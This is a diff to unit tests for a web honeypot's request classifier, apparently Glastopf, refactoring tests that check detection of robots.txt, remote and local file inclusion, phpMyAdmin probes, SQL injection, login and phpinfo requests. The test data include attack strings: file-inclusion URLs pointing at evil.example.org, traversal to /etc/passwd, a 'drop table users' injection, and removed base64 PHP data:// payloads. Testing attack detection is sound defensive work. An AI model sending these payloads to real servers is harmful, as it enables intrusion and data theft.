@@ -19,7 +19,7 @@ import os
 import tempfile
 import shutil
 
-from glastopf.modules.HTTP.util import HTTPRequest
+from glastopf.modules.HTTP.handler import HTTPHandler
 from glastopf.glastopf import GlastopfHoneypot
 import glastopf.modules.classification.request as request_classifier
 
@@ -35,11 +35,9 @@ class TestClassifier(unittest.TestCase):
         GlastopfHoneypot.prepare_environment(self.tmpdir)
         self.requestClassifier = request_classifier.Classifier(data_dir)
 
-
     def tearDown(self):
         if os.path.isdir(self.tmpdir):
             shutil.rmtree(self.tmpdir)
-
 
     def test_robots_classifier(self):
         """Objective: Test classifier for robots.txt requests
@@ -47,13 +45,10 @@ class TestClassifier(unittest.TestCase):
         Expected Response: matched pattern to robots
         Note: """
 
-        parsed_request = HTTPRequest()
-        parsed_request.method = 'GET'
-        parsed_request.url = '/robots.txt'
-        parsed_request.version = 'HTTP/1.0'
+        httphandler = HTTPHandler('GET /robots.txt HTTP/1.0', None)
 
-        matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        self.assertTrue(matched_pattern == 'robots')
+        matched_pattern = self.requestClassifier.classify_request(httphandler)
+        self.assertTrue(matched_pattern == 'robots', '{0} did not match expected pattern'.format(matched_pattern))
 
     def test_rfi_classifier(self):
         """Objective: Test classifier for RFI requests
@@ -61,63 +56,18 @@ class TestClassifier(unittest.TestCase):
         Expected Response: matched pattern to rfi
         Note: """
 
-        parsed_request = HTTPRequest()
-        parsed_request.method = 'GET'
-        parsed_request.url = '/index.php?file=http://evil.example.org/t.txt?'
-        parsed_request.version = 'HTTP/1.0'
-        matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        self.assertTrue(matched_pattern == 'rfi')
+        intput_paths = ('/index.php?file=http://evil.example.org/t.txt?',
+                        '/index.php?file=%20http://evil.example.org/t.txt?',
+                        '/index.php?file=https://evil.example.org/t.txt?',
+                        '/index.php?file=ftp://evil.example.org/t.txt?,'
+                        '/index.php?file=ftps://evil.example.org/t.txt?',
+                        're/test.jsp?r=%22http://www.gogole.it/')
 
-        parsed_request.method = 'GET'
-        parsed_request.url = '/index.php?file= http://evil.example.org/t.txt?'
-        parsed_request.version = 'HTTP/1.0'
-        matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        self.assertTrue(matched_pattern == 'rfi')
-
-        parsed_request.method = 'GET'
-        parsed_request.url = '/index.php?file=https://evil.example.org/t.txt?'
-        parsed_request.version = 'HTTP/1.0'
-        matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        self.assertTrue(matched_pattern == 'rfi')
-
-        parsed_request.method = 'GET'
-        parsed_request.url = '/index.php?file=ftp://evil.example.org/t.txt?'
-        parsed_request.version = 'HTTP/1.0'
-        matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        self.assertTrue(matched_pattern == 'rfi')
-
-        parsed_request.method = 'GET'
-        parsed_request.url = '/index.php?file=ftps://evil.example.org/t.txt?'
-        parsed_request.version = 'HTTP/1.0'
-        matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        self.assertTrue(matched_pattern == 'rfi')
-
-        parsed_request.method = 'GET'
-        parsed_request.url = 're/test.jsp?r=%22http://www.gogole.it/'
-        parsed_request.version = 'HTTP/1.0'
-        matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        self.assertTrue(matched_pattern == 'rfi')
-        
-        # TODO enable the tests below when the rfi module can handle such kind of attacks
-        #parsed_request.method = 'GET'
-        #parsed_request.url = '/index.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4='
-        #parsed_request.version = 'HTTP/1.0'
-        #matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        #self.assertTrue(matched_pattern == 'rfi')
-
-
-        #parsed_request.method = 'GET'
-        #parsed_request.url = '/index.php?file= data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4='
-        #parsed_request.version = 'HTTP/1.0'
-        #matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        #self.assertTrue(matched_pattern == 'rfi')
-
-
-        #parsed_request.method = 'GET'
-        #parsed_request.url = 'index,php?file=php://input'
-        #parsed_request.version = 'HTTP/1.0'
-        #matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        #self.assertTrue(matched_pattern == 'rfi')
+        for path in intput_paths:
+            request = 'GET {0} HTTP/1.0'.format(path)
+            http_handler = HTTPHandler(request, None)
+            matched_pattern = self.requestClassifier.classify_request(http_handler)
+            self.assertTrue(matched_pattern == 'rfi', '{0} did not match expected pattern'.format(matched_pattern))
 
     def test_lfi_classifier(self):
         """Objective: Test classifier for LFI requests
@@ -125,20 +75,14 @@ class TestClassifier(unittest.TestCase):
         Expected Response: matched pattern to rfi
         Note: """
 
-        parsed_request = HTTPRequest()
-        parsed_request.method = 'GET'
-        parsed_request.url = '/index.php?file=../../../../../../etc/passwd'
-        parsed_request.version = 'HTTP/1.0'
-        matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        self.assertTrue(matched_pattern == 'lfi')
+        intput_paths = ('/index.php?file=../../../../../../etc/passwd',
+                        '/index.php?file=../../../../../../etc/passwd%00')
 
-        parsed_request = HTTPRequest()
-        parsed_request.method = 'GET'
-        parsed_request.url = '/index.php?file=../../../../../../etc/passwd%00'
-        parsed_request.version = 'HTTP/1.0'
-        matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        self.assertTrue(matched_pattern == 'lfi')
-
+        for path in intput_paths:
+            request = 'GET {0} HTTP/1.0'.format(path)
+            http_handler = HTTPHandler(request, None)
+            matched_pattern = self.requestClassifier.classify_request(http_handler)
+            self.assertTrue(matched_pattern == 'lfi', '{0} did not match expected pattern'.format(matched_pattern))
 
     def test_phpmyadmin_classifier(self):
         """Objective: Test classifier for phpmyadmin requests
@@ -146,40 +90,17 @@ class TestClassifier(unittest.TestCase):
         Expected Response: matched pattern to phpmyadmin
         Note: """
 
-        parsed_request = HTTPRequest()
-        parsed_request.method = 'GET'
-        parsed_request.url = '/phpmyadmin/'
-        parsed_request.version = 'HTTP/1.0'
-        matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        self.assertTrue(matched_pattern == 'phpmyadmin')
+        intput_paths = ('/phpmyadmin/',
+                        '/phpMyadmin/',
+                        '/pma/',
+                        '/PMA',
+                        '/phpMyAdmin-2.8.2/')
 
-        parsed_request = HTTPRequest()
-        parsed_request.method = 'GET'
-        parsed_request.url = '/phpMyadmin/'
-        parsed_request.version = 'HTTP/1.0'
-        matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        self.assertTrue(matched_pattern == 'phpmyadmin')
-
-        parsed_request = HTTPRequest()
-        parsed_request.method = 'GET'
-        parsed_request.url = '/pma/'
-        parsed_request.version = 'HTTP/1.0'
-        matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        self.assertTrue(matched_pattern == 'phpmyadmin')
-
-        parsed_request = HTTPRequest()
-        parsed_request.method = 'GET'
-        parsed_request.url = '/PMA/'
-        parsed_request.version = 'HTTP/1.0'
-        matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        self.assertTrue(matched_pattern == 'phpmyadmin')
-
-        parsed_request = HTTPRequest()
-        parsed_request.method = 'GET'
-        parsed_request.url = '/phpMyAdmin-2.8.2/'
-        parsed_request.version = 'HTTP/1.0'
-        matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        self.assertTrue(matched_pattern == 'phpmyadmin')
+        for path in intput_paths:
+            request = 'GET {0} HTTP/1.0'.format(path)
+            http_handler = HTTPHandler(request, None)
+            matched_pattern = self.requestClassifier.classify_request(http_handler)
+            self.assertTrue(matched_pattern == 'phpmyadmin', '{0} did not match expected pattern'.format(matched_pattern))
 
     def test_sqli_classifier(self):
         """Objective: Test classifier for SQL Injection requests
@@ -187,12 +108,15 @@ class TestClassifier(unittest.TestCase):
         Expected Response: matched pattern to sqli
         Note: """
 
-        parsed_request = HTTPRequest()
-        parsed_request.method = 'GET'
-        parsed_request.url = '/index.php?id=" or 1; drop talble users;--'
-        parsed_request.version = 'HTTP/1.0'
-        matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        self.assertTrue(matched_pattern == 'sqli')
+        intput_paths = ('/index.php?id="%20or%201;%20drop%20talble%20users;--',)
+
+        for path in intput_paths:
+            request = 'GET {0} HTTP/1.0'.format(path)
+            http_handler = HTTPHandler(request, None)
+            print http_handler.request_path
+            print http_handler.request_query
+            matched_pattern = self.requestClassifier.classify_request(http_handler)
+            self.assertTrue(matched_pattern == 'sqli', '{0} did not match expected pattern'.format(matched_pattern))
 
     def test_login_classifier(self):
         """Objective: Test classifier for login requests
@@ -200,12 +124,13 @@ class TestClassifier(unittest.TestCase):
         Expected Response: matched pattern to login
         Note: """
 
-        parsed_request = HTTPRequest()
-        parsed_request.method = 'POST'
-        parsed_request.url = '/login'
-        parsed_request.version = 'HTTP/1.0'
-        matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        self.assertTrue(matched_pattern == 'login')
+        intput_paths = ('/login',)
+
+        for path in intput_paths:
+            request = 'GET {0} HTTP/1.0'.format(path)
+            http_handler = HTTPHandler(request, None)
+            matched_pattern = self.requestClassifier.classify_request(http_handler)
+            self.assertTrue(matched_pattern == 'login', '{0} did not match expected pattern'.format(matched_pattern))
 
     def test_phpinfo_classifier(self):
         """Objective: Test classifier for phpinfo debug/test requests
@@ -213,37 +138,15 @@ class TestClassifier(unittest.TestCase):
         Expected Response: matched pattern to phpinfo
         Note: """
 
-        parsed_request = HTTPRequest()
-        parsed_request.method = 'POST'
-        parsed_request.url = '/phpinfo.php?ss'
-        parsed_request.version = 'HTTP/1.0'
-        matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        self.assertTrue(matched_pattern == 'phpinfo')
+        intput_paths = ('/phpinfo.php?ss',
+                        '/phpinfo.php',
+                        '/info.php',
+                        '/info.php?page',
+                        '/phpinfo.html')
 
-        parsed_request = HTTPRequest()
-        parsed_request.method = 'POST'
-        parsed_request.url = '/phpinfo.php'
-        parsed_request.version = 'HTTP/1.0'
-        matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        self.assertTrue(matched_pattern == 'phpinfo')
+        for path in intput_paths:
+            request = 'GET {0} HTTP/1.0'.format(path)
+            http_handler = HTTPHandler(request, None)
+            matched_pattern = self.requestClassifier.classify_request(http_handler)
+            self.assertTrue(matched_pattern == 'phpinfo', '{0} did not match expected pattern'.format(matched_pattern))
 
-        parsed_request = HTTPRequest()
-        parsed_request.method = 'POST'
-        parsed_request.url = '/info.php'
-        parsed_request.version = 'HTTP/1.0'
-        matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        self.assertTrue(matched_pattern == 'phpinfo')
-
-        parsed_request = HTTPRequest()
-        parsed_request.method = 'POST'
-        parsed_request.url = '/info.php?page'
-        parsed_request.version = 'HTTP/1.0'
-        matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        self.assertTrue(matched_pattern == 'phpinfo')
-
-        parsed_request = HTTPRequest()
-        parsed_request.method = 'POST'
-        parsed_request.url = '/phpinfo.html'
-        parsed_request.version = 'HTTP/1.0'
-        matched_pattern = self.requestClassifier.classify_request(parsed_request)
-        self.assertTrue(matched_pattern == 'phpinfo')
